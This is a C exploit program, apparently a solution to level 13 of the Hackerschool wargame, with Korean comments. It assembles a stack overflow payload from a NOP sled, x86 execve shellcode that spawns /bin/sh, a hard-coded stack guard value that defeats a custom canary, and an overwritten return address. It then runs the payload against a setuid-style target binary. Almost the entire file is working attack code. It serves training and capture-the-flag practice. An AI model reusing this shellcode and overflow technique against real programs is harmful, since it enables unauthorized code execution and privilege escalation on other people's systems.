/*
 * Author : superdk@hanmail.net
 * DATA : exploit about hackerschool level13
 * LICENSE : GNU License
 */

#include <stdio.h>
#include <stdlib.h>

#define NOP 0x90
#define NOP1 120
#define NOP2 891
#define BUFSIZE 1056   /* NOPs(120) + shellcode(25) + NOPs(891) + stackguard(4) +  + NOPs(8) + SFP(4) + ret(4) */

// 변조하면 안되는 스태 가드의 값
char stackgd[] = "\x67\x45\x23\x01";

// 배시셸을 실행시키는 셸코드
char shellcode[] =
        "\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
        "\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";

// char str[1024] 배열의 시작 주소
char retAddr[] = "\xa0\xf2\xff\xbf";

int main()
{
    char cmdBuf[BUFSIZE];
    int i, j, k, l, stackLen, shellLen, retLen;

	// 스택가드, 셸코드, 리턴 주소의 길이 확인
    stackLen = strlen(stackgd);
    shellLen = strlen(shellcode);
    retLen = strlen(retAddr);

	// 셸코드 앞부분까지 NOP 썰매 할당
    for(i=0; i<NOP1; i++)
        cmdBuf[i] = NOP;
    
	// NOP 뒤에 셸코드 할당
    for(j=0; j<shellLen; j++)
        cmdBuf[i++] = shellcode[j];
    
	// 나머지 공간에 NOP 썰매 할당
    for(j=0; j<NOP2; j++)
        cmdBuf[i++] = NOP;
    
	// 스택 가드의 원본 덮어 쓰기
    for(j=0; j<stackLen; j++)
        cmdBuf[i++] = stackgd[j];
    
	// 나머지 공간에 NOP 썰매 할당
    for(j=0; j<retLen*3; j++)
        cmdBuf[i++] = NOP;
    
	// 배시 셸코드의 주소 할당
    for(j=0; j<retLen; j++)
        cmdBuf[i++] = retAddr[j];

    execl("/home/level13/attackme", "attackme", cmdBuf, 0);

}
